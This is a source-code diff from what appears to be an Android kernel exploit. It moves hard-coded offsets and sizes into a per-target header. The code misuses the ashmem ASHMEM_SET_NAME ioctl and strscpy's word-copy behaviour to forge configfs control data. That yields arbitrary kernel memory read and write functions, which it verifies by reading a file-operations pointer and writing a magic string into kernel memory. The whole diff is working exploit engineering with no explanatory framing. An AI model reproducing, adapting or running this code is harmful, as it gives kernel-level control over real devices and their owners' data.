@@ -17,25 +17,14 @@
 #include "04_fake_kernel_objects.h"
 #include "08_ashmem_configfs_rw.h"
 #include "90_diagnostic_checkpoint.h"
+#include "target.h"
 
 #define OSS_ASHMEM_OPEN_FLAGS (O_RDWR | O_CLOEXEC)
-#define OSS_ASHMEM_PATH_SIZE 0x100
-#define OSS_ASHMEM_NAME_LEN 0x100
-#define OSS_ASHMEM_SET_NAME 0x41007701UL
-#define OSS_CONFIGFS_CONTROL_LEN 0x80
-#define OSS_CONFIGFS_COUNT 0x6d6873612f766564ULL /* "dev/ashm" */
-#define OSS_STRSCPY_WORD_SIZE 8
 
-#define OSS_CONFIGFS_PAGE_CONTROL_OFF 0x05
-#define OSS_CONFIGFS_READ_STATE_CONTROL_OFF 0x15
-#define OSS_CONFIGFS_READ_STATE_CONTROL_LEN 0x31
-#define OSS_CONFIGFS_WRITE_STATE_CONTROL_OFF 0x15
-#define OSS_CONFIGFS_WRITE_STATE_CONTROL_LEN 0x48
-
-_Static_assert(OSS_CONFIGFS_COUNT <= INT64_MAX,
+_Static_assert(TARGET_CONFIGFS_COUNT <= INT64_MAX,
                "configfs read position must fit off_t");
 
-static char g_ashmem_path[OSS_ASHMEM_PATH_SIZE] = "/dev/ashmem";
+static char g_ashmem_path[TARGET_ASHMEM_PATH_SIZE] = "/dev/ashmem";
 static int g_ashmem_path_state;
 
 static int select_openable_ashmem_path(const char *path) {
@@ -61,7 +50,7 @@ int oss_prepare_kernel_rw_path(void) {
     if (n > 0) {
       boot_id[n] = '\0';
       boot_id[strcspn(boot_id, "\r\n")] = '\0';
-      char candidate[OSS_ASHMEM_PATH_SIZE];
+      char candidate[TARGET_ASHMEM_PATH_SIZE];
       snprintf(candidate, sizeof(candidate), "/dev/ashmem%s", boot_id);
       if (select_openable_ashmem_path(candidate)) {
         g_ashmem_path_state = 1;
@@ -80,7 +69,7 @@ int oss_prepare_kernel_rw_path(void) {
           strcmp(entry->d_name, "ashmem") == 0) {
         continue;
       }
-      char candidate[OSS_ASHMEM_PATH_SIZE];
+      char candidate[TARGET_ASHMEM_PATH_SIZE];
       snprintf(candidate, sizeof(candidate), "/dev/%s", entry->d_name);
       struct stat alias;
       if (stat(candidate, &alias) == 0 && S_ISCHR(alias.st_mode) &&
@@ -122,17 +111,17 @@ int oss_open_kernel_rw(void) {
 }
 
 static int set_name_prefix(int fd, const unsigned char *src, size_t len) {
-  if (len >= OSS_ASHMEM_NAME_LEN) {
+  if (len >= TARGET_ASHMEM_NAME_LEN) {
     errno = EINVAL;
     return -1;
   }
-  unsigned char name[OSS_ASHMEM_NAME_LEN];
+  unsigned char name[TARGET_ASHMEM_NAME_LEN];
   memset(name, 0x41, sizeof(name));
   for (size_t i = 0; i < len; i++) {
     name[i] = src[i] < 2 ? 1 : src[i];
   }
   name[len] = 0;
-  return ioctl(fd, OSS_ASHMEM_SET_NAME, name);
+  return ioctl(fd, TARGET_ASHMEM_SET_NAME_IOCTL, name);
 }
 
 static int set_ashmem_name_blob(int fd, const unsigned char *src, size_t len) {
@@ -147,7 +136,7 @@ static int set_ashmem_name_blob(int fd, const unsigned char *src, size_t len) {
   return 0;
 }
 
-/* ZZHL strscpy() loads and stores eight bytes at a time. When a word contains
+/* The selected target's strscpy() loads and stores whole target words. When a word contains
  * NUL it stores the bytes through NUL and zeroes the rest of that word. The
  * later words retain their previous contents. ASHMEM_SET_NAME always gives
  * strscpy() a 256-byte limit, so even short prefixes take this word path. */
@@ -161,8 +150,8 @@ static void simulate_set_name_prefix(unsigned char *destination,
   }
   if (prefix_len < destination_len) {
     size_t word_end =
-        (prefix_len + OSS_STRSCPY_WORD_SIZE) &
-        ~(size_t)(OSS_STRSCPY_WORD_SIZE - 1);
+        (prefix_len + TARGET_STRSCPY_WORD_SIZE) &
+        ~(size_t)(TARGET_STRSCPY_WORD_SIZE - 1);
     if (word_end > destination_len) {
       word_end = destination_len;
     }
@@ -184,30 +173,30 @@ static void simulate_ashmem_name_blob(const unsigned char *source, size_t len,
 static int control_range_survives(const unsigned char *control,
                                   const unsigned char *encoded,
                                   size_t offset, size_t len) {
-  return offset <= OSS_CONFIGFS_CONTROL_LEN &&
-         len <= OSS_CONFIGFS_CONTROL_LEN - offset &&
+  return offset <= TARGET_CONFIGFS_CONTROL_LEN &&
+         len <= TARGET_CONFIGFS_CONTROL_LEN - offset &&
          memcmp(control + offset, encoded + offset, len) == 0;
 }
 
 static int read_control_survives_strscpy(
-    const unsigned char control[OSS_CONFIGFS_CONTROL_LEN]) {
-  unsigned char encoded[OSS_CONFIGFS_CONTROL_LEN];
+    const unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
+  unsigned char encoded[TARGET_CONFIGFS_CONTROL_LEN];
   simulate_ashmem_name_blob(control, sizeof(encoded), encoded);
   return control_range_survives(control, encoded,
-                                OSS_CONFIGFS_PAGE_CONTROL_OFF,
+                                TARGET_CONFIGFS_PAGE_CONTROL_OFF,
                                 sizeof(uint64_t)) &&
          control_range_survives(control, encoded,
-                                OSS_CONFIGFS_READ_STATE_CONTROL_OFF,
-                                OSS_CONFIGFS_READ_STATE_CONTROL_LEN);
+                                TARGET_CONFIGFS_READ_STATE_OFF,
+                                TARGET_CONFIGFS_READ_STATE_LEN);
 }
 
 static int write_control_survives_strscpy(
-    const unsigned char control[OSS_CONFIGFS_CONTROL_LEN]) {
-  unsigned char encoded[OSS_CONFIGFS_CONTROL_LEN];
+    const unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
+  unsigned char encoded[TARGET_CONFIGFS_CONTROL_LEN];
   simulate_ashmem_name_blob(control, sizeof(encoded), encoded);
   return control_range_survives(control, encoded,
-                                OSS_CONFIGFS_WRITE_STATE_CONTROL_OFF,
-                                OSS_CONFIGFS_WRITE_STATE_CONTROL_LEN);
+                                TARGET_CONFIGFS_WRITE_STATE_OFF,
+                                TARGET_CONFIGFS_WRITE_STATE_LEN);
 }
 
 struct configfs_read_plan {
@@ -218,15 +207,15 @@ struct configfs_read_plan {
 
 static int make_configfs_read_plan(uint64_t target_addr, size_t len,
                                    struct configfs_read_plan *plan) {
-  if (!plan || len == 0 || len >= OSS_CONFIGFS_COUNT || len > SSIZE_MAX ||
+  if (!plan || len == 0 || len >= TARGET_CONFIGFS_COUNT || len > SSIZE_MAX ||
       target_addr > UINT64_MAX - (len - 1)) {
     errno = EOVERFLOW;
     return 0;
   }
 
-  plan->offset = OSS_CONFIGFS_COUNT - len;
+  plan->offset = TARGET_CONFIGFS_COUNT - len;
   plan->page = target_addr - plan->offset;
-  plan->kernel_check_len = OSS_CONFIGFS_COUNT - plan->offset;
+  plan->kernel_check_len = TARGET_CONFIGFS_COUNT - plan->offset;
 
   if (plan->offset > INT64_MAX ||
       plan->page + plan->offset != target_addr ||
@@ -239,14 +228,15 @@ static int make_configfs_read_plan(uint64_t target_addr, size_t len,
 
 static int prepare_configfs_read_control(
     uint64_t target_addr, size_t len, struct configfs_read_plan *plan,
-    unsigned char control[OSS_CONFIGFS_CONTROL_LEN]) {
+    unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
   if (!make_configfs_read_plan(target_addr, len, plan)) {
     return 0;
   }
-  memset(control, 1, OSS_CONFIGFS_CONTROL_LEN);
-  memcpy(control + OSS_CONFIGFS_PAGE_CONTROL_OFF, &plan->page,
+  memset(control, 1, TARGET_CONFIGFS_CONTROL_LEN);
+  memcpy(control + TARGET_CONFIGFS_PAGE_CONTROL_OFF, &plan->page,
          sizeof(plan->page));
-  memset(control + OSS_CONFIGFS_READ_STATE_CONTROL_OFF, 0, 0x34);
+  memset(control + TARGET_CONFIGFS_READ_STATE_OFF, 0,
+         TARGET_CONFIGFS_READ_ZERO_LEN);
   if (!read_control_survives_strscpy(control)) {
     errno = EILSEQ;
     return 0;
@@ -256,25 +246,26 @@ static int prepare_configfs_read_control(
 
 static int prepare_configfs_write_control(
     uint64_t target_addr, size_t len,
-    unsigned char control[OSS_CONFIGFS_CONTROL_LEN]) {
+    unsigned char control[TARGET_CONFIGFS_CONTROL_LEN]) {
   if (len == 0 || target_addr > UINT64_MAX - (len - 1)) {
     errno = EOVERFLOW;
     return 0;
   }
-  uint64_t low = target_addr & 0xffffffULL;
+  uint64_t low = target_addr & TARGET_CONFIGFS_ADDR_LOW_MASK;
   uint64_t end = low + len;
   if ((end >> 31) != 0) {
     errno = EOVERFLOW;
     return 0;
   }
-  uint64_t high = target_addr & ~0xffffffULL;
+  uint64_t high = target_addr & ~TARGET_CONFIGFS_ADDR_LOW_MASK;
   uint32_t end32 = (uint32_t)end;
   uint32_t zero = 0;
-  memset(control, 1, OSS_CONFIGFS_CONTROL_LEN);
-  memset(control + 0x15, 0, 0x38);
-  memcpy(control + 0x4d, &high, sizeof(high));
-  memcpy(control + 0x55, &end32, sizeof(end32));
-  memcpy(control + 0x59, &zero, sizeof(zero));
+  memset(control, 1, TARGET_CONFIGFS_CONTROL_LEN);
+  memset(control + TARGET_CONFIGFS_WRITE_STATE_OFF, 0,
+         TARGET_CONFIGFS_WRITE_ZERO_LEN);
+  memcpy(control + TARGET_CONFIGFS_WRITE_HIGH_OFF, &high, sizeof(high));
+  memcpy(control + TARGET_CONFIGFS_WRITE_END_OFF, &end32, sizeof(end32));
+  memcpy(control + TARGET_CONFIGFS_WRITE_ZERO_OFF, &zero, sizeof(zero));
   if (!write_control_survives_strscpy(control)) {
     errno = EILSEQ;
     return 0;
@@ -284,18 +275,18 @@ static int prepare_configfs_write_control(
 
 int oss_kernel_read_plan_supported(uint64_t target_addr, size_t len) {
   struct configfs_read_plan plan;
-  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
+  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
   return prepare_configfs_read_control(target_addr, len, &plan, control);
 }
 
 int oss_kernel_write_plan_supported(uint64_t target_addr, size_t len) {
-  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
+  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
   return prepare_configfs_write_control(target_addr, len, control);
 }
 
 int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
   struct configfs_read_plan plan;
-  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
+  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
   if (!buf ||
       !prepare_configfs_read_control(target_addr, len, &plan, control)) {
     fprintf(stderr,
@@ -331,7 +322,7 @@ int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
 
 int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
                       size_t len) {
-  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
+  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
   if (!buf || !prepare_configfs_write_control(target_addr, len, control)) {
     fprintf(stderr,
             "[aar_aaw] unsafe write plan rejected fd=%d addr=%016llx len=%zu "
@@ -339,7 +330,7 @@ int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
             fd, (unsigned long long)target_addr, len, errno, strerror(errno));
     return 0;
   }
-  uint64_t low = target_addr & 0xffffffULL;
+  uint64_t low = target_addr & TARGET_CONFIGFS_ADDR_LOW_MASK;
 
   errno = 0;
   if (set_ashmem_name_blob(fd, control, sizeof(control)) != 0) {
@@ -380,7 +371,7 @@ int oss_kernel_write64(int fd, uint64_t target_addr, uint64_t value) {
 int oss_verify_kernel_access_plan_supported(uint64_t ashmem_misc_fops_addr,
                                             uint64_t page_base) {
   static const char magic[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
-  uint64_t scratch = page_base | 0x2180ULL;
+  uint64_t scratch = page_base | TARGET_CONFIGFS_SCRATCH_LIVE_OFF;
   return oss_kernel_read_plan_supported(ashmem_misc_fops_addr,
                                         sizeof(uint64_t)) &&
          oss_kernel_write_plan_supported(scratch, sizeof(magic)) &&
@@ -390,7 +381,7 @@ int oss_verify_kernel_access_plan_supported(uint64_t ashmem_misc_fops_addr,
 int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
                                 uint64_t page_base, int *landed) {
   oss_diag_checkpoint("aar-verify-start");
-  uint64_t expect = page_base | OSS_PRIMARY_FOPS_LIVE_OFFSET;
+  uint64_t expect = page_base | TARGET_PRIMARY_FOPS_LIVE_OFF;
   uint64_t got = UINT64_MAX;
   if (!oss_kernel_read(fd, ashmem_misc_fops_addr, &got, sizeof(got))) {
     return 0;
@@ -412,7 +403,7 @@ int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
   oss_diag_checkpoint("aar-fops-verified");
 
   static const char magic[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
-  uint64_t scratch = page_base | 0x2180ULL;
+  uint64_t scratch = page_base | TARGET_CONFIGFS_SCRATCH_LIVE_OFF;
   if (!oss_kernel_write(fd, scratch, magic, sizeof(magic))) {
     fprintf(stderr, "[aar_aaw] magic-string write failed\n");
     return 0;
